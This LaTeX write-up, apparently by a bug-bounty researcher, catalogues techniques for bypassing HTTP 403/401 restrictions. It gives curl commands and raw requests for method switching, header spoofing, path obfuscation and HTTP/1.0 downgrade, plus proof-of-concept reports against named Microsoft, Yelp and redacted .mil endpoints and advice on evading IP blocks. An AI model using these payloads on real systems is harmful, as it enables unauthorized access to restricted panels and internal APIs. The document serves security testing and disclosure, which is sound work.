\documentclass{article}
\usepackage[utf8]{inputenc}

% Page layout adjustments
\addtolength{\oddsidemargin}{-.5in}
\addtolength{\evensidemargin}{-.5in}
\addtolength{\textwidth}{1in}
\addtolength{\topmargin}{-.5in}
\addtolength{\textheight}{1in}

\title{HTTP 403, 401 Bypass Techniques}
\author{Eyad El-Taher}
\date{\today}

\begin{document}

\maketitle

\section*{How I Bypassed 403 Forbidden \& Accessed Restricted Pages}

\subsection*{Introduction}
A 403 Forbidden error is often seen as a dead end, but in security testing, it is frequently a sign of a misconfigured gateway or Web Application Firewall (WAF). By using specific bypass techniques, ethical hackers can often access restricted administrative panels and sensitive directories.

\subsection*{What is a 403 Forbidden Error?}
A 403 error occurs when the server understands the request but refuses to fulfill it. 



\noindent \textbf{Common Causes:}
\begin{itemize}
    \item \textbf{IP Restrictions:} Access is limited to specific internal IP ranges.
    \item \textbf{WAF Rules:} A firewall identifies the request as "suspicious" and blocks it.
    \item \textbf{Permission Misconfiguration:} Incorrectly set file or directory permissions.
\end{itemize}

\subsection*{Successful Bypass Techniques}

\subsubsection*{1. Alternative HTTP Methods}
Security filters often only restrict the \texttt{GET} method. Changing the request method can bypass the filter while still triggering the desired backend logic.

\begin{verbatim}
curl -X POST https://target.com/admin
curl -X HEAD https://target.com/admin
\end{verbatim}
\textit{Tip: Always test with \texttt{OPTIONS, TRACE, PUT,} or \texttt{PATCH}.}

\subsubsection*{2. Modifying Request Headers}
Many WAFs look at headers to determine if a request is coming from a trusted local source or a specific proxy.

\begin{itemize}
    \item \textbf{Spoofing Localhost:}
    \texttt{curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin}
    \item \textbf{Spoofing Referer:}
    \texttt{curl -H "Referer: https://target.com/allowed-page" https://target.com/admin}
    \item \textbf{Mimicking Crawlers:}
    \texttt{curl -H "User-Agent: Googlebot" https://target.com/admin}
\end{itemize}



\subsubsection*{3. Path Obfuscation Tricks}
Normalizers on the backend may treat different paths as identical, while the WAF may only look for a specific string match like \texttt{/admin}.

\begin{itemize}
    \item \textbf{Suffixing:} \texttt{https://target.com/admin/.}
    \item \textbf{Path Traversal:} \texttt{https://target.com/admin/\%2e\%2e/}
    \item \textbf{Whitespace/Encoding:} \texttt{https://target.com/admin\%20/}
\end{itemize}

\subsubsection*{4. Direct IP Access}
If the 403 restriction is implemented at the Virtual Host level, accessing the server via its direct IP address instead of its domain name can sometimes bypass the restriction entirely.
\begin{verbatim}
curl http://192.168.1.1/admin
\end{verbatim}

\subsubsection*{5. HTTP vs. HTTPS Switching}
Security rules are sometimes inconsistently applied across protocols. A resource forbidden on HTTPS might be left accessible (or less strictly filtered) over plain HTTP.

\begin{verbatim}
curl -k http://target.com/admin
curl -k https://target.com/admin
\end{verbatim}

\section*{Advanced 403 Forbidden Bypass Techniques}

\subsection*{1. Applying Special Characters to the URL}
Adding special characters to the URL path can trick the server into interpreting the request differently, often bypassing string-matching security filters.



\begin{itemize}
    \item \textbf{Dot Segments:} Use \texttt{/admin/./} or \texttt{/admin\%2e/} to represent the current directory.
    \item \textbf{Trailing Slashes:} Appending a slash (e.g., \texttt{/admin/}) can bypass rules that look for an exact string match without the slash.
    
   \item \textbf{String terminators} use (\%00, 0x00, //, ;, \%, !, ?, [] etc.) — adding those to the end of the path and inside the path
    \item \textbf{Encoding:} Use encoded representations like \texttt{\%20} (space) to alter the signature of the path.
\end{itemize}
\textit{Note: Always test payloads on isolated systems to avoid unintended consequences.}

\subsection*{2. Headers Manipulation}
Altering or injecting specific HTTP headers can trick the server into believing the request originated from a trusted internal source.



\begin{itemize}
    \item \textbf{Internal IP Injection:} Use headers like \texttt{X-Forwarded-For}, \texttt{X-Originating-IP}, or \texttt{X-Remote-IP}.
    \item \textbf{Trusted Values:} Experiment with \texttt{127.0.0.1}, \texttt{localhost}, or internal cloud IP ranges (e.g., \texttt{10.0.0.1}).
\end{itemize}

\subsection*{3. Changing IP Address or Using a VPN}
Restrictions are often tied to the reputation of an IP address. Web Application Firewalls (WAFs) may block IPs flagged for suspicious activity.
\begin{itemize}
    \item \textbf{VPNs:} Use services like \textbf{NordVPN} to quickly rotate your exit IP.
    \item \textbf{ProxyChains:} Useful for chaining multiple proxies to evade IP-based rate limiting.
\end{itemize}

\subsection*{4. Fuzzing HTTP Methods}
Fuzzing involves systematically testing an endpoint with various HTTP methods to identify unexpected server behavior.

\medskip
\noindent \textbf{Testing with FFUF:}
\begin{verbatim}
ffuf -u https://example.com/endpoint -X FUZZ -w http_methods_wordlist.txt
\end{verbatim}
Replace \texttt{FUZZ} with methods such as \texttt{OPTIONS, PATCH, TRACE}, etc.

\subsection*{5. Fuzzing the URL Path}
Automated fuzzing can uncover misconfigurations in path validation logic by testing hundreds of URL variations.



\medskip
\noindent \textbf{Example Payload Test:}
\begin{verbatim}
curl https://example.com/admin/./
\end{verbatim}
This is highly effective against logic that fails to properly normalize the path before applying security checks.

\section*{Supplementary 403/401 Bypass Methodology}

\subsection*{Distinguishing 401 Unauthorized vs. 403 Forbidden}
Understanding the specific error code is critical for selecting the correct bypass vector.



\begin{itemize}
    \item \textbf{401 Unauthorized:} The request lacks valid authentication credentials. This is an "Identity" issue. The server is asking for a login or a valid token.
    \item \textbf{403 Forbidden:} The server understands the identity (or lack thereof) but refuses access based on permissions or security policies. This is an "Authorization" or "Policy" issue.
\end{itemize}

\subsection*{1. Advanced URL Manipulation \& Case Sensitivity}
Servers running on Windows (IIS) or specific configurations of Apache/Nginx may handle case sensitivity and path segments inconsistently.

\noindent \textbf{Unique Path Variations:}
\begin{itemize}
    \item \textbf{Case Flipping:} \texttt{/Admin}, \texttt{/AdMin}, or \texttt{/ADMIN} (Effective if the WAF is case-sensitive but the backend is not).
    \item \textbf{Semicolon Injection:} \texttt{/;/admin} or \texttt{//;//admin}.
    \item \textbf{Path Normalization:} \texttt{/.;/admin} or \texttt{/./admin/..}.
    \item \textbf{Format Appending:} \texttt{/admin.json} (Tricks the server into thinking it is a public API/static file).
    \item \textbf{Double Slashes:} \texttt{//admin//}.
\end{itemize}

\subsection*{2. URL Rewriting \& Routing Headers}
Some applications use internal routing headers to determine the destination of a request. If the WAF only inspects the main URL but allows these headers, a bypass is possible.

\medskip
\noindent \textbf{X-Original-URL / X-Rewrite-URL Technique:}
Instead of requesting the forbidden page directly, request a known public page and tell the application to rewrite the destination internally.

\begin{verbatim}
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin

OR

GET /anything HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
\end{verbatim}



\subsection*{3. Parameter Tampering}
Access controls are sometimes implemented via client-side parameters that can be manipulated in the request.

\begin{itemize}
    \item \textbf{Boolean Logic:} Change \texttt{isAdmin=false} to \texttt{isAdmin=true}.
    \item \textbf{View State:} Change \texttt{?view=restricted} to \texttt{?view=public}.
    \item \textbf{Parameter Removal:} Try removing the parameter entirely to see if the server defaults to an "Allow" state when the restriction variable is missing.
\end{itemize}

\subsection*{4. Method Overriding via Headers}
If the server blocks specific HTTP methods but allows header-based overrides, you can trick the backend into executing a forbidden method while the WAF only sees a permitted one.

\begin{verbatim}
POST /admin HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET

OR

X-HTTP-Override: GET
\end{verbatim}

\subsection*{5. Strategic Fuzzing Targets}
While \texttt{/admin} might be blocked, the developers may have forgotten to protect sub-directories. Always fuzz for children of restricted paths:
\begin{itemize}
    \item \texttt{/admin/users}
    \item \texttt{/admin/config}
    \item \texttt{/admin/settings}
\end{itemize}

\begin{quote}
    \textbf{Technique Insight:} Using the \textbf{Param Miner} extension in Burp Suite is highly effective for discovering "hidden" headers like \texttt{X-Original-URL} that the application might be listening for.
\end{quote}


\section*{Protocol Downgrade: Bypassing 403 via HTTP/1.0}

\subsection*{The Vulnerability Concept}
In modern web traffic, HTTP/1.1 is the standard, requiring a \texttt{Host} header for correct request routing. However, many legacy systems maintain backward compatibility with \textbf{HTTP/1.0}. This can be exploited if a Web Application Firewall (WAF) or security gateway is only configured to validate and filter HTTP/1.1 traffic.



\subsection*{Real-World Comparison: Microsoft Lyncdiscover Case}
The following example demonstrates how stripping headers and downgrading the protocol version can trick a server into a "local trust" state, bypassing a 403 Forbidden error.

\medskip
\noindent \textbf{Initial Request (403 Forbidden):}
Standard HTTP/1.1 request including all identifying headers.
\begin{verbatim}
GET /reach%2fsip.svc HTTP/1.1
Host: lyncdiscover.microsoft.com
User-Agent: curl/7.79.1
Accept: */*
Connection: close
\end{verbatim}

\medskip
\noindent \textbf{Bypass Request (200 OK):}
The protocol is downgraded to HTTP/1.0 and all header values are cleared.
\begin{verbatim}
GET /reach%2fsip.svc HTTP/1.0
\end{verbatim}



\subsection*{Why This Works}
\begin{itemize}
    \item \textbf{Defaulting to Local:} When the \texttt{Host} header is absent in an HTTP/1.0 request, some misconfigured security mechanisms default the destination address to the server itself.
    \item \textbf{Identity Masking:} This causes the request to be identified as "local" rather than external, effectively bypassing IP-based or external-access restrictions.
    \item \textbf{Information Leakage:} This method can also bypass CDNs to obtain original server IPs by observing the \texttt{Location} header in a resulting redirect.
\end{itemize}

\begin{quote}
    \textbf{Note:} This specific bypass was validated against \texttt{lyncdiscover.microsoft.com} and resulted in access to restricted \texttt{.svc} files and WSDL documentation.
\end{quote}


\section*{Vulnerability Report: 403 Forbidden Bypass (DoD VDP)}

\subsection*{Vulnerability Summary}
\begin{itemize}
    \item \textbf{Type:} 403 Forbidden Bypass
    \item \textbf{Target:} \texttt{www.[redacted].mil}
    \item \textbf{Severity:} Medium (Assessed by DoD)
    \item \textbf{Status:} Resolved
    \item \textbf{Reported via:} DoD Vulnerability Disclosure Program (VDP)
\end{itemize}

\subsection*{Vulnerability Description}
A vulnerability was identified where certain restricted pages returning a \texttt{403 Forbidden} status could be accessed by manipulating the HTTP request structure. The access control mechanism failed to properly validate HTTP methods, allowing unauthorized access when the following conditions were met:
\begin{enumerate}
    \item Changing the HTTP method from \texttt{GET} to \texttt{POST}.
    \item Appending the HTTP header: \texttt{Content-Length: 0}.
\end{enumerate}



\subsection*{Steps to Reproduce}
\begin{enumerate}
    \item Attempt to access a restricted page via a standard browser or \texttt{GET} request $\rightarrow$ \textbf{403 Forbidden}.
    \item Intercept the request and modify the method to \texttt{POST}.
    \item Add the header \texttt{Content-Length: 0}.
    \item Send the request $\rightarrow$ The server responds with the protected content.
\end{enumerate}

\subsection*{Proof of Concept (PoC)}

\noindent \textbf{Denied Request:}
\begin{verbatim}
curl -X GET https://www.[redacted].mil/[path]
\end{verbatim}

\noindent \textbf{Successful Bypass:}
\begin{verbatim}
curl -H "Content-Length: 0" -X POST https://www.[redacted].mil/[path]
\end{verbatim}



\begin{quote}
    \textbf{Technique Insight:} This bypass exploits misconfigured security filters that only apply restrictions to \texttt{GET} requests or fail to authorize \texttt{POST} requests that do not carry a data payload (indicated by \texttt{Content-Length: 0}).
\end{quote}


\section*{Vulnerability Report: 403 Bypass via Trusted Proxy Header}

\subsection*{Vulnerability Summary}
\begin{itemize}
    \item \textbf{Type:} Access control bypass via trusted proxy header
    \item \textbf{Technique:} Header spoofing (\texttt{X-Forwarded-For})
    \item \textbf{Affected Platform:} Yelp Business Owner App
    \item \textbf{Severity:} Medium (CVSS $\sim$6.1)
\end{itemize}

\subsection*{Vulnerability Description}
The web application incorrectly trusted the client-supplied \texttt{X-Forwarded-For} HTTP header. By supplying a loopback address (\texttt{127.0.0.1}), the backend treated the request as originating from an internal service.



\noindent \textbf{Accessed Endpoints:}
\begin{itemize}
    \item Health and system status endpoints
    \item Swagger API documentation
    \item Business Owner App backend APIs
\end{itemize}

\subsection*{Root Cause}
The backend logic relied solely on the \texttt{X-Forwarded-For} header to differentiate between internal and external traffic. Because this header was not sanitized or stripped at the load balancer layer, external attackers could spoof an internal identity.

\subsection*{Proof of Concept (PoC)}

\subsubsection*{PoC 1 -- Internal Status Endpoint}
A standard request to the \texttt{/status} endpoint is denied by the server:
\begin{verbatim}
curl -k https://biz-app.yelp.com/status
-- Response: {"error":{"id":"PredicateMismatch"}}
\end{verbatim}

\noindent Adding the spoofed header grants full access to system metadata:
\begin{verbatim}
curl -k https://biz-app.yelp.com/status -H "X-Forwarded-For: 127.0.0.1"
\end{verbatim}

\subsubsection*{PoC 2 -- Swagger API Documentation}
The Swagger specification, normally restricted, is returned when the internal IP is spoofed:
\begin{verbatim}
curl -k https://biz-app.yelp.com/swagger.json -H "X-Forwarded-For: 127.0.0.1"
\end{verbatim}



\subsection*{Evidence of Internal Trust}
The backend's response headers explicitly confirmed that the spoofed IP was accepted as internal:
\begin{itemize}
    \item \texttt{x-is-internal-ip-address: true}
    \item \texttt{x-routing-service: routing-main--useast1}
    \item \texttt{x-proxied: 10-65-64-83-useast1aprod}
\end{itemize}

\subsection*{Impact}
This vulnerability represents a significant trust boundary violation. Attackers could enumerate internal-only APIs, view sensitive service metadata, and potentially interact with administrative backend functionality.

\begin{quote}
    \textbf{Remediation:} Edge proxies and load balancers should be configured to strip or overwrite \texttt{X-Forwarded-For} headers coming from untrusted external sources.
\end{quote}


\end{document}